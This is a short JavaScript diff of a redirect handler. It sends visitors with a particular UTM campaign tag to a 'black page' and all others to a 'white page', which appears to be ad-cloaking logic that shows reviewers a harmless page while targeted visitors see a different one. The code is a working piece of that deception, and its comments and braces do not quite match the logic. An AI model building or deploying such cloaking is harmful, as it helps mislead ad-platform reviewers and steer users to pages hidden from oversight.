@@ -11,10 +11,10 @@ export default function handler(req, res) {
     // Redirection logic
     if (utmCampaign === '__AID_NAME__') {
       // UTM campaign 'l1' takes priority for both desktop and mobile
-      res.writeHead(302, { Location: whitePageURL });
+      res.writeHead(302, { Location: blackPageURL });
     } else{
       // Mobile devices without 'l1' campaign
-      res.writeHead(302, { Location: blackPageURL });
+      res.writeHead(302, { Location: whitePageURL });
   
     res.end();
   }}
